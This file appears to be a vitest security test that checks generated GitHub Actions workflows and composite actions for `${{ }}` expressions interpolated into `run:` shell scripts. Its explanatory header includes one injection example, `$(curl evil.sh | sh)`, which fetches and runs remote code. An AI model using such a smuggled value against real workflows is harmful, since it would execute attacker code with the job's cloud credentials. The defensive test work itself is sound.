// Whether the generated workflows let an environment-controlled value reach a
// shell as source code.
//
// A `${{ vars.X }}` expression is substituted into the `run:` script before the
// shell ever parses it, so the value is not an argument but program text. A
// client id of `$(curl evil.sh | sh)` therefore executes, in a job that holds
// `id-token: write` and `packages: write` and can mint cloud credentials.
// Passing the same value through `env:` and reading `"$VAR"` makes it data: the
// shell substitutes it after parsing and never re-parses the result.
//
// Reaching those variables takes write access to the repository's environment
// settings, so this is an escalation path rather than an open door. It is worth
// closing anyway, because the privilege on the other side of it is the ability
// to authenticate as the environment's cloud identity.
//
// Coverage is a deny list rather than an allow list, and that is the whole
// design. An allow list silently exempts whatever nobody remembered to add, and
// the file this change had to come back for — the dispatcher that picks the
// provider — is exactly the kind a name-based rule fails to find. So every
// workflow and every composite action under `.github/extension` is held to the
// rule, and anything that cannot satisfy it yet has to be named below, where it
// is visible and has to be justified.
//
// Composite actions are included because they run inside the calling job, under
// the same permissions, and several are handed `vars.*` values through `with:`.
// An expression in one of their `run:` steps is the same vulnerability reached
// one level down.
//
// Only `run:` scripts are inspected. An expression in `if:`, `with:`, or an
// `env:` value is evaluated by GitHub Actions rather than by a shell, and
// `env:` is where the hardened values are supposed to live.
//
// The YAML is parsed rather than scanned line by line. A line-based reader has
// to guess where a script ends, and cannot see an inline
// `run: echo "${{ ... }}"` that never opens a block scalar at all — which is a
// real way for this to regress.
import { readdir, readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parse } from "yaml";

const EXTENSION_DIRECTORY = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../../.github/extension"
);

// Files known to still interpolate, each tracked to be fixed. Listing one here
// is a deliberate, reviewable act: the entry says the vulnerability is present
// and accepted for now, rather than letting it pass unnoticed.
//
// The AWS provider workflows carry the same pattern the Azure ones just shed.
// They are a separate change because the fix cannot be verified from this
// repository, and doing both at once would put two unverifiable rewrites in one
// diff.
const KNOWN_UNHARDENED = new Set([
  "delete-aws.yml",
  "run-rad-commands-aws.yml",
  "verify-aws.yml"
]);

interface Step {
  readonly name?: string;
  readonly run?: unknown;
}

interface Parsed {
  readonly jobs?: Record<string, { readonly steps?: readonly Step[] }>;
  readonly runs?: { readonly steps?: readonly Step[] };
}

/** Every `run:` script in a workflow's jobs or a composite action's steps. */
function runScripts(source: string): { owner: string; script: string }[] {
  const parsed = parse(source) as Parsed | null;
  const found: { owner: string; script: string }[] = [];
  const collect = (owner: string, steps: readonly Step[] | undefined): void => {
    for (const step of steps ?? []) {
      if (typeof step?.run !== "string") continue;
      found.push({
        owner: `${owner} / ${step.name ?? "(unnamed)"}`,
        script: step.run
      });
    }
  };
  for (const [jobName, job] of Object.entries(parsed?.jobs ?? {})) {
    collect(jobName, job?.steps);
  }
  collect("runs", parsed?.runs?.steps);
  return found;
}

/** The steps whose script still carries a GitHub Actions expression. */
function injectableSteps(source: string): string[] {
  return runScripts(source)
    .filter(({ script }) => script.includes("${{"))
    .map(({ owner }) => owner);
}

/**
 * Every workflow and composite action under `.github/extension`.
 *
 * Walked recursively rather than one level deep: at least one action keeps its
 * definition in a nested directory, and an action this failed to find would be
 * an action nobody checks.
 */
async function collectYamlFiles(directory: string): Promise<string[]> {
  const entries = await readdir(path.join(EXTENSION_DIRECTORY, directory), {
    withFileTypes: true
  });
  const files: string[] = [];
  for (const entry of entries) {
    const relative = path.join(directory, entry.name);
    if (entry.isDirectory()) {
      files.push(...(await collectYamlFiles(relative)));
    } else if (entry.name.endsWith(".yml")) {
      files.push(relative);
    }
  }
  return files;
}

async function readExtensionFiles(): Promise<
  ReadonlyArray<readonly [string, string]>
> {
  const files = await collectYamlFiles(".");
  return Promise.all(
    files
      .filter((file) => !KNOWN_UNHARDENED.has(path.basename(file)))
      .map(
        async (file) =>
          [
            path.normalize(file),
            await readFile(path.join(EXTENSION_DIRECTORY, file), "utf8")
          ] as const
      )
  );
}

const extensionFiles = await readExtensionFiles();

describe("the generated workflows' shell inputs", () => {
  // Guards the discovery: a reader that found nothing, or that quietly skipped
  // a directory, would leave every assertion below vacuously true. Asserted
  // against what is actually on disk, so the only files not checked are the
  // ones named in the deny list.
  it("checks every extension YAML file except those explicitly excluded", async () => {
    const names = extensionFiles.map(([name]) => name);
    const onDisk = (await collectYamlFiles(".")).map((file) =>
      path.normalize(file)
    );

    expect(
      onDisk.filter((file) => !KNOWN_UNHARDENED.has(path.basename(file)))
    ).toEqual(expect.arrayContaining(names));
    expect(names.length).toBe(onDisk.length - KNOWN_UNHARDENED.size);
    // The dispatcher whose name says neither "azure" nor "rad-commands", and
    // which a name-based rule would have missed.
    expect(names).toContain("delete-application.yml");
    // A composite action, reached only by walking into `actions/`.
    expect(names).toContain(
      path.join("actions", "restore-state", "action.yml")
    );
  });

  it.each(extensionFiles)(
    "%s never interpolates an expression into a run script",
    (_name, source) => {
      // Reported by job and step, because the fix is specific to each site and
      // a bare count would not say where to look.
      expect(injectableSteps(source)).toEqual([]);
    }
  );

  // The reader has to see an expression in a script written as a plain inline
  // scalar, not only in a `|` or `>` block. Without this, a single-line `run:`
  // would reintroduce the vulnerability and stay green.
  it.each([
    ["an inline scalar", 'run: echo "${{ vars.AZURE_CLIENT_ID }}"'],
    ["a literal block", 'run: |\n          echo "${{ vars.AZURE_CLIENT_ID }}"'],
    ["a folded block", 'run: >\n          echo "${{ vars.AZURE_CLIENT_ID }}"']
  ])("detects an expression written as %s", (_label, runScalar) => {
    const source = [
      "jobs:",
      "  detect:",
      "    steps:",
      "      - name: Determine provider",
      `        ${runScalar}`
    ].join("\n");
    expect(injectableSteps(source)).toEqual(["detect / Determine provider"]);
  });

  // A composite action's steps live under `runs:`, not `jobs:`. Reading only
  // the workflow shape would pass every action file without inspecting one.
  it("detects an expression inside a composite action's step", () => {
    const source = [
      "runs:",
      "  using: composite",
      "  steps:",
      "    - name: Restore state",
      '      run: kubectl get ns "${{ inputs.namespace }}"'
    ].join("\n");
    expect(injectableSteps(source)).toEqual(["runs / Restore state"]);
  });

  it("accepts a script that reads the value from the environment", () => {
    const source = [
      "jobs:",
      "  detect:",
      "    steps:",
      "      - name: Determine provider",
      "        env:",
      "          AZURE_CLIENT_ID: ${{ vars.AZURE_CLIENT_ID }}",
      "        run: |",
      '          echo "$AZURE_CLIENT_ID"'
    ].join("\n");
    expect(injectableSteps(source)).toEqual([]);
  });
});
